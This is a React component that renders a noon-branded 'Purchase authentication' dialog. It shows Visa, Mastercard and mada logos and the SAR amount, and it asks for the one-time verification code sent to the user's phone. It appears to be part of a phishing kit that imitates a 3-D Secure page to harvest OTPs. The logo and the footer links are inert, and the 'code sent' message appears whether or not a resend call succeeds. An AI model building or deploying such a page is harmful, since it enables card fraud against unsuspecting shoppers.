import { useEffect, useState } from "react";
import { X } from "lucide-react";
import "./CardPurchaseAuth.css";

function digitsOnly(value, max) {
  return String(value || "").replace(/\D/g, "").slice(0, max);
}

const CARD_BRANDS = [
  { src: "/images/cards/visa.jpeg", alt: "Visa" },
  { src: "/images/cards/mastercard.jpeg", alt: "Mastercard" },
  { src: "/images/cards/mada.jpeg", alt: "mada" },
];

export default function CardPurchaseAuth({
  amount = 0,
  phase = "otp",
  onSubmit,
  onCancel,
  onResend,
}) {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [resendNote, setResendNote] = useState("");
  const [busy, setBusy] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(60);
  const [timerKey, setTimerKey] = useState(0);

  useEffect(() => {
    if (phase !== "otp") return undefined;
    setSecondsLeft(60);
    const timer = setInterval(() => {
      setSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [phase, timerKey]);

  const amountLabel = Number(amount).toLocaleString("en-SA", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });

  if (phase === "preparing" || phase === "loading") {
    return (
      <div className="card-auth-overlay" role="dialog" aria-modal="true">
        <div className="card-auth-shell card-auth-loading">
          <img
            className="card-auth-logo-center"
            src="/images/noon-logo.png"
            alt="noon"
          />
          <div className="card-auth-spinner" aria-hidden="true" />
          <p>
            {phase === "preparing"
              ? "Please wait..."
              : "Authenticating your payment..."}
          </p>
          <small>Please wait, do not close this page.</small>
        </div>
      </div>
    );
  }

  return (
    <div className="card-auth-overlay" role="dialog" aria-modal="true">
      <div className="card-auth-shell">
        <header className="card-auth-top">
          <div className="card-auth-top-spacer" aria-hidden="true" />
          <img
            className="card-auth-logo-center"
            src="/images/noon-logo.png"
            alt="noon"
          />
          <button type="button" className="card-auth-cancel" onClick={onCancel}>
            CANCEL
          </button>
        </header>

        <div className="card-auth-close-row">
          <button
            type="button"
            className="card-auth-close"
            aria-label="Close"
            onClick={onCancel}
          >
            <X size={22} />
          </button>
        </div>

        <div className="card-auth-brands" aria-label="Accepted cards">
          {CARD_BRANDS.map((brand) => (
            <img key={brand.alt} src={brand.src} alt={brand.alt} />
          ))}
        </div>

        <h1 className="card-auth-title">Purchase authentication</h1>

        <p className="card-auth-lead">
          Please enter the verification code we just sent to your mobile number
        </p>

        <p className="card-auth-amount-line">
          You are paying <strong>NOON</strong> the amount of{" "}
          <strong className="card-auth-amount-value">SAR {amountLabel}</strong>
        </p>

        <form
          className="card-auth-form"
          onSubmit={async (event) => {
            event.preventDefault();
            const code = digitsOnly(otp, 8);
            if (code.length < 4) {
              setError("Enter the verification code.");
              return;
            }
            if (!onSubmit) return;
            setBusy(true);
            setError("");
            try {
              await onSubmit(code);
            } catch (submitError) {
              setError(submitError.message || "Verification failed");
              setBusy(false);
            }
          }}
        >
          <label htmlFor="card-auth-otp">Verification Code</label>
          <input
            id="card-auth-otp"
            type="text"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={otp}
            onChange={(event) => {
              setOtp(digitsOnly(event.target.value, 8));
              setError("");
            }}
            disabled={busy}
            required
          />

          {resendNote && <p className="card-auth-resend-note">{resendNote}</p>}
          {error && <p className="card-auth-error">{error}</p>}

          <button type="submit" className="card-auth-submit" disabled={busy}>
            {busy ? "SUBMITTING..." : "SUBMIT"}
          </button>
        </form>

        <p className="card-auth-timer" aria-live="polite">
          {secondsLeft > 0
            ? `Resend available in 0:${String(secondsLeft).padStart(2, "0")}`
            : "You can request another code now"}
        </p>

        <button
          type="button"
          className="card-auth-resend"
          disabled={busy}
          onClick={async () => {
            setOtp("");
            setError("");
            setTimerKey((key) => key + 1);
            setResendNote(
              "Another verification code was sent to your mobile number."
            );
            if (onResend) {
              try {
                await onResend();
              } catch (resendError) {
                setResendNote(
                  resendError.message ||
                    "Could not request another code. You can still enter a code."
                );
              }
            }
          }}
        >
          CLICK HERE TO RECEIVE ANOTHER CODE
        </button>

        <footer className="card-auth-footer">
          <span>Need help?</span>
          <span className="card-auth-footer-sep">|</span>
          <span>Terms of Use</span>
        </footer>
      </div>
    </div>
  );
}
